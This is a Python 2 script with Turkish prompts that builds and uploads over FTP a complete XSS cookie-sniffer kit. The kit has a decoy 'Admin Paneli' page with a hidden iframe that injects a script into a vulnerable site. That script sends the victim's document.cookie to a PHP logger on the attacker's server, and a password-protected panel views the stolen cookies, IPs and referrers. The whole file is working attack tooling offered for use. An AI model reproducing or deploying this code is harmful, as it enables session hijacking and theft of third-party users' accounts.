#-*- coding: utf-8 -*-
import ftplib, sys, webbrowser, os
os.system("clear")
print "XCreate - ExitStars - ddevilz.com"
print ""
print "~ Sunucu Bilgileri"
sunucu = raw_input("Sunucu: ")
kadi = raw_input("Kullanıcı Adı: ")
sifre = raw_input("Kullanıcı Şifre: ")
print ""
try:
	baglanti = ftplib.FTP(sunucu)
	baglanti.login(kadi,sifre)
	print "Bağlantı Başarılı, Kuruluma Geçiliyor."
except:
	print "Bağlantı Başarısız, Program Kapanıyor."
	sys.exit()

print ""
print "~ Sniffer Bilgileri"
print "Örn: http://siteismi.com | Sonunda slach (/) olmadan..."
site = raw_input("Sniffer'ın Kurulacağı Web Site Adresi: ")
print "Örn: http://target.com/vuln.php?id="
vsl = raw_input("XSS Açığı Bulunan Site & Sayfa: ")


klasor = raw_input("Sniffer'ın Kurulacağı Klasör: ")
k_adi = raw_input("Sniffer Kullanıcı Adı: ")
k_sifre = raw_input("Sniffer Kullanıcı Şifre: ")

baglanti.mkd(klasor)
baglanti.cwd(klasor)

jsl = site+"/"+klasor+"/ch.js"
tams = site+"/"+klasor

index_d = open("index.html", "w")
index_d.write("""<html>
<head>
	<title>Admin Paneli</title>
	<script type="text/javascript">
document.write('<iframe name="I1" src="{}%22%3E%3CSCRIPT%20SRC={}%3E%3C/SCRIPT%3E" height="1" width="1" frameborder="0" marginwidth="1" marginheight="1" style="position: absolute; left: 0; top: 0"></iframe>')
</script>
<meta charset="utf-8" />
</head>
<body>
<center>
<h3>Admin Paneli</h3>
<br />
Kullanıcı Adı: <input type="text" /><br /><br />
Şifre: 		   <input type="password" /><br /><br />
<input type="button" value="Giriş" />
</center>
</body>
</head>""".format(vsl, jsl))
index_d.close()

ch_d = open("ch.js", "w")
ch_d.write("""window.location.href="{}/sniffer.php?c=" + document.cookie;""".format(tams))
ch_d.close()

sniffer_d = open("sniffer.php", "w")
sniffer_d.write("""<?php
/*
Bug Researchers - XSS Sniffer
Coded by Bug Researchers
*/
// verilerimizi alıp dosyaya yollayalım
@$cookie = $_GET['c'];
@$tarih = date("m/d/Y g:i:s a");
@$ip = $_SERVER['REMOTE_ADDR'];
@$gelinen_adres = $_SERVER['HTTP_REFERER'];
@$log_dosya = 'log.html';
// log dosyasına verilerimiz kaydedilecek ama dosyamız var mı?yoksa oluştur o zaman neyi bekliyon
if(!file_exists($log_dosya))
{
	touch($log_dosya) or die('Log dosyasi olusturulamadi!');
	chmod($log_dosya, 0777);
}
// dosyayı aç bakalım daha verileri girecez
$dosya = fopen($log_dosya, 'a');
// verilerimizi artık dosyaya yazalım ;)
fwrite($dosya , "<h3><b><font color=#00FF00>* Bug Researchers - XSS Sniffer *</b></h3><br /> <b>IP Adresi:</b> <font color=green>" . $ip . "</font><br />" . "<b>Tarih:</b> <font color=green>" . $tarih . "</font><br /><b>Adres:</b> <font color=green>"  . $gelinen_adres . "</font><br /><b>Cookie:</b> <font color=green>" . $cookie .  "</font><br />");
// aferim dosya değişkeni görevini tamamladın.artık kapanabilirsin.bb
fclose($dosya);
?>""")
sniffer_d.close()

cikis_d = open("cikis.php", "w")
cikis_d.write("""<?php
ob_start();
session_start();
session_destroy();
header('Location: log.php');
?>""")
cikis_d.close()

log_d = open("log.php", "w")
log_d.write("""<?php
/*
Bug Researchers - XSS Sniffer
*/
ob_start();
session_start();
// eğer artiz hekırımız giriş yapmadıysa giriş kapısını aç 
if(@$_SESSION['giris'] != 'ok')
{
?>
	
	<html><head><title>Bug Researchers - XSS Sniffer</title>
	<meta charset="utf-8" />
	<link rel="icon" type="image/png" href="http://www.cyber-warrior.org/favicon.ico">
	<!-- Everything for CW!   -->
	<style>
	body 
	{
		background-image: url('http://img202.imageshack.us/img202/5518/93522745.gif');
		color: #00FF00;
	}
	input {
		color: #00FF00;
		background-color: green;
	}
	.button
	{
		background-image: url('http://img19.imageshack.us/img19/9641/menuxi.jpg');
	}
	
	</style></head>
	<body>
	<center><br /><br /><br /><br /><br />
	<h1>Bug Researchers - XSS Sniffer Login</h1><br /><br />
	<?php
	
	if(@$_GET['giris']=='kontrol')
    {
		// giriş bilgileri tabi ne olacak ;)
		$log_kullanici = '"""+k_adi+"""';
		$log_sifre     = '"""+k_sifre+"""';
		
		// pfff .. kontrol et bakalım corç. 
		if($log_kullanici == $_POST['kullanici'] && $log_sifre == $_POST['sifre'])
		{
			$_SESSION['giris'] = 'ok';
			header('Location: log.php');
		}
		else
		{
			echo '<font color="yellow">Girdiğiniz bilgiler yanlış!</font><br /><br />';
		}
	}
	
	?>
	<form action="?giris=kontrol" method="POST">
	Kullanıcı Adı: <input type="text" name="kullanici" /><br /><br />
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Şifre: <input type="password" name="sifre" /><br /><br />
	<input type="submit" value="Giriş" class="button" />
	</form>
	</body>
	</html>
	
	
<?php
	
}
else{
?>
<style>a {color: green; font-weight: bold;} textarea { background-color: black; color: #00FF00;}</style>
<html><head><title>Bug Researchers - XSS Sniffer Log</title><link rel="icon" type="image/png" href="http://www.cyber-warrior.org/favicon.ico"><meta charset="utf-8"><style>body { color: yellow; background-image: url('http://img202.imageshack.us/img202/5518/93522745.gif');}</style></head><body><br><center>
<a href="?">Anasayfa </a> | <a href="?durum=index">index.html Düzenle</a> | <a href="?durum=ch">ch.js Düzenle</a> | <a href="?durum=cikis">Çıkış</a>
<?php
// index.html'i düzenle bakalım. Hadi hadi çalış biraz
if(@$_GET['durum'] == 'index')
{	
$dosya = fopen('index.html','r');
?>
<form action="?kontrol=index" method="post">
<?php	echo '<br /><textarea cols="70" rows="18" name="index">' . fread($dosya,99999) . '</textarea>'; ?>
<br >
<br>
<input type="submit" value="Kaydet" />
</form>
<?php
}
// kaydet
if(@$_GET['kontrol'] == 'index')
{
	$index = fopen('index.html','w');
	fputs($index,$_POST['index']) or die('<font color="yellow">Kaydedemedi!</font>');
	header("Location: log.php");
}
// ch.html'i düzenle bakalım. Hadi hadi çalış biraz
if(@$_GET['durum'] == 'ch')
{	
$dosya = fopen('ch.js','r');
?>
<form action="?kontrol=ch" method="post">
<?php	echo "<br /><textarea cols=70 rows=18 name=ch>" . fread($dosya,99999) . "</textarea>"; ?>
<br >
<br>
<input type="submit" value="Kaydet" />
</form>
<?php
}
// kaydet
if(@$_GET['kontrol'] == 'ch')
{
	$ch = fopen('ch.js','w');
	fputs($ch,$_POST['ch']) or die('<font color="yellow">Kaydedemedi!</font>');
	header("Location: log.php");
}
if (@$_GET['durum']=='cikis')
{
	session_destroy();
	header('Location: log.php');
}
$log = @file_get_contents('log.html') or die('<br /><br />Henüz log bulunamadı.');
echo $log;
}
?>""")
log_d.close()

log2_d = open("log.html", "w")
log2_d.close()

log3_d = open("log.txt", "w")
log3_d.close()

try:
  baglanti.storbinary("STOR index.html", open("index.html","rb"))
  baglanti.storbinary("STOR ch.js", open("ch.js","rb"))
  baglanti.storbinary("STOR sniffer.php", open("sniffer.php","rb"))
  baglanti.storbinary("STOR cikis.php", open("cikis.php","rb"))
  baglanti.storbinary("STOR log.php", open("log.php","rb"))
  baglanti.storbinary("STOR log.html", open("log.html","rb"))
  baglanti.storbinary("STOR log.txt", open("log.txt","rb"))
  print "Sniffer Yüklendi!"
  print "-> Sniffer Adresi: "+tams+"/inex.html"
  print "-> Sniffer Admin Paneli: "+tams+"/log.php"
  print "-> Kullanıcı Adı: "+k_adi
  print "-> Kullanıcı Şifre: "+k_sifre
  print ""
  print "Link açılsın mı? [e/h]"
  cevap = raw_input("> ")
  if cevap == "e" or "E":
  	webbrowser.open_new(tams+"/log.php")
  	print "Private Security - Kara Ayaz - Cyber-Warrior"
  else:
  	print "Private Security - Kara Ayaz - Cyber-Warrior"
except:
 print "Bir Hata Oluştur, Program Kapatılıyor."
 sys.exit()
